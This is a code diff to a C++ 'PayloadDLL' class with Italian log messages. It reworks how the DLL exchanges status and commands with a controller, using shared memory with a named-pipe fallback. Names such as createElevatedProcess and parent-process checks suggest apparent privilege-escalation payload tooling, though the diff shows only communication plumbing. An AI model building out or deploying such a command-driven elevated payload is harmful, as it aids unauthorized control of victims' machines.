@@ -45,11 +45,17 @@ bool PayloadDLL::initialize() {
         logger.logError(L"Verifica processo padre fallita");
         return false;
     }
+
+    // Prova prima con shared memory
+    useSharedMemory = sharedMemoryManager.initialize(SHARED_MEM_NAME);
     
-    // Crea pipe per comunicazione
-    if (!createPipe()) {
-        logger.logError(L"Creazione pipe fallita");
-        return false;
+    // Se shared memory fallisce, usa named pipe
+    if (!useSharedMemory) {
+        logger.logInfo(L"Fallback a named pipe");
+        if (!createPipe()) {
+            logger.logError(L"Inizializzazione comunicazione fallita");
+            return false;
+        }
     }
     
     initialized = true;
@@ -190,34 +196,49 @@ bool PayloadDLL::createElevatedProcess(const std::wstring& commandLine) {
 }
 
 bool PayloadDLL::sendStatus(DWORD status) {
-    if (!initialized || hPipe == INVALID_HANDLE_VALUE) return false;
+    if (!initialized) return false;
     
-    DWORD bytesWritten;
-    if (!WriteFile(hPipe, &status, sizeof(DWORD), &bytesWritten, NULL)) {
-        logger.logError(L"Invio stato fallito");
-        return false;
+    if (useSharedMemory) {
+        SharedData sharedData = {};
+        sharedData.status = status;
+        sharedData.processId = GetCurrentProcessId();
+        return sharedMemoryManager.writeData(sharedData);
+    } else {
+        DWORD bytesWritten;
+        if (!WriteFile(hPipe, &status, sizeof(DWORD), &bytesWritten, NULL)) {
+            logger.logError(L"Invio stato fallito");
+            return false;
+        }
+        return bytesWritten == sizeof(DWORD);
     }
-    
-    return bytesWritten == sizeof(DWORD);
 }
 
 bool PayloadDLL::receiveCommands() {
-    if (!initialized || hPipe == INVALID_HANDLE_VALUE) return false;
+    if (!initialized) return false;
     
-    DWORD bytesRead;
-    PayloadData tempData;
-    
-    if (!ReadFile(hPipe, &tempData, sizeof(PayloadData), &bytesRead, NULL)) {
-        logger.logError(L"Ricezione comandi fallita");
+    if (useSharedMemory) {
+        SharedData sharedData;
+        if (!sharedMemoryManager.readData(sharedData)) {
+            logger.logError(L"Ricezione comandi fallita");
+            return false;
+        }
+        memcpy(&data, &sharedData, sizeof(PayloadData));
+        return true;
+    } else {
+        DWORD bytesRead;
+        PayloadData tempData;
+        
+        if (!ReadFile(hPipe, &tempData, sizeof(PayloadData), &bytesRead, NULL)) {
+            logger.logError(L"Ricezione comandi fallita");
+            return false;
+        }
+        
+        if (bytesRead == sizeof(PayloadData)) {
+            memcpy(&data, &tempData, sizeof(PayloadData));
+            return true;
+        }
         return false;
     }
-    
-    if (bytesRead == sizeof(PayloadData)) {
-        memcpy(&data, &tempData, sizeof(PayloadData));
-        return true;
-    }
-    
-    return false;
 }
 
 bool PayloadDLL::setupCOMServer() {
